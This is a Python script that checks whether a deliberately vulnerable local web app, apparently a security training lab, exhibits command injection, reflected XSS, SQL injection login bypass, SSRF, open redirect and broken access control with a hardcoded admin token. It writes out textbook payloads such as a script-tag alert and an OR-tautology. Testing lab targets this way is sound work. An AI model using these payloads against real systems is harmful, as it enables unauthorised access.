import urllib.request
import urllib.parse
import sys
import time

BASE_URL = "http://localhost:8000"

def check_vulnerability(name, url, expected_content=None, expected_status=200, headers=None, data=None):
    print(f"Checking {name}...", end=" ")
    try:
        req = urllib.request.Request(url, data=data, headers=headers or {})
        with urllib.request.urlopen(req) as response:
            status = response.getcode()
            content = response.read().decode('utf-8', errors='ignore')

            if status != expected_status:
                print(f"FAILED (Status: {status}, Expected: {expected_status})")
                return False

            if expected_content and expected_content not in content:
                print(f"FAILED (Content mismatch)")
                # print(f"Got: {content[:100]}...")
                return False

            print("SUCCESS")
            return True
    except urllib.error.HTTPError as e:
        if e.code == expected_status:
             print("SUCCESS")
             return True
        print(f"FAILED (HTTPError: {e.code})")
        return False
    except Exception as e:
        print(f"FAILED (Exception: {e})")
        return False

def verify_all():
    print("Verifying vulnerabilities...")

    # Existing vulnerabilities
    check_vulnerability("Command Injection", f"{BASE_URL}/ping?host=127.0.0.1", expected_status=200)
    check_vulnerability("Reflected XSS", f"{BASE_URL}/greet?name=%3Cscript%3Ealert(1)%3C/script%3E", expected_content="<script>alert(1)</script>")
    check_vulnerability("Broken Access Control", f"{BASE_URL}/admin", headers={"X-Admin-Token": "admin123"}, expected_content="FLAG{hardcoded_creds}")

    # New vulnerabilities
    # SQL Injection
    # We expect to log in as admin with a tautology
    # URL encode: admin' OR '1'='1 -> admin%27%20OR%20%271%27%3D%271
    check_vulnerability("SQL Injection", f"{BASE_URL}/login?username=admin%27%20OR%20%271%27%3D%271", expected_content="Logged in as admin")

    # SSRF
    # Using example.com for stability
    check_vulnerability("SSRF", f"{BASE_URL}/proxy?url=http://example.com", expected_content="Example Domain")

    # Open Redirect
    # urllib follows redirects by default, so we check if we land on example.com
    check_vulnerability("Open Redirect", f"{BASE_URL}/redirect?url=http://example.com", expected_content="Example Domain")

if __name__ == "__main__":
    verify_all()
